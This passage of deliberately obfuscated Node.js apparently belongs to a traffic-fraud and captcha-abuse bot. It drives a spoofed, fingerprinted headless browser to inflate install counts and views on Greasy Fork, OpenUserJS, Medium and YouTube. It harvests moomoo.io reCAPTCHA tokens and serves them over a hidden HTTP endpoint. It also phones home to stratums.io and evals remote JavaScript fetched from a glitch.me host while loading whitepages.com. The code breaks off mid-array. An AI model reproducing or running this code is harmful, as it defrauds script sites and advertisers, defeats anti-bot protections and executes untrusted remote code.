      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + Z(0x16) + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + Y(0x2, 'soME') + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + X(0x6) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + Z(0x1d),
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + Z(0x17) + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + Y(0x1b, 'b[55') + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2587 * -0x1 + -0x204f + -0x538
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x683 * -0x1 + -0xe7d + 0x1500)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x977 + -0xf75 * 0x2 + 0x28c5), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x58 + -0xe34 + -0x1 * -0xef0), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x94 * -0x4 + 0xac * 0x2b + -0x6a5 * 0x4;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1 * 0x932 + -0x1 * 0x24f5 + 0x1bc3; w < getRandomInt(0x103 + -0x2c * -0x7f + 0x4f * -0x4a, 0x1 * -0x1b3b + -0x19a5 + 0xb * 0x4cf); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xfe6 * -0x10 + 0x53dc + -0x33ee * 0x2);
        }
      }();
    }, 0x1b8d + 0x1868 + -0x133 * 0x2b), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a0 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x55 * 0x5b + 0x66d + 0x17ca;
      const x = await v[a0(0x1a)]();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x7ee + -0x1b55 * -0x1 + -0x1367, 0x28 * 0x5 + -0x1319 + 0x1283)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x35 * 0x2f8 + 0xd0b8 + -0x7c7 * 0x20);
    }, -0xbb1 * -0x1 + 0x139 * 0x6 + -0x12a3), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x330 * 0xc + 0x64 * 0x16 + 0x76a * 0x4;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1 * 0xf06 + 0x1a * 0xc1 + -0x16e8), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x437 * -0x5 + 0x81 * 0x17 + -0x20aa), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xade6 * 0x26 + -0xa * 0x2b00 + 0x53342 * -0x2);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1d77 + 0x1f0b + -0x3c1e * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x375 + 0x779 + 0x6 * -0x8a);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x23 + -0x39c3 + 0x5930);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = b;
  async function f() {
    const a2 = d,
      a1 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1f6 * -0x6 + 0x365 * 0x2 + 0x62f * -0x3) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * 0xbf0 + -0x7ca * -0x5 + -0x1b01 * 0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x42 * -0x81 + -0x122a + 0x114 * -0xe, D['indexOf']('\x20'));
        return B ? E['slice'](0x1013 + -0xd2b + -0x4 * 0xba, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x3c0 + -0x1 * 0xd9b + 0x386b),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0xcdd * 0x3 + -0x4 * 0x355 + 0x5afb),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + a1(0x5, 'soME') + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)[a2(0x12)](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + a3(0x18, '(zkz') + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + a3(0xe, 'pT(W') + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
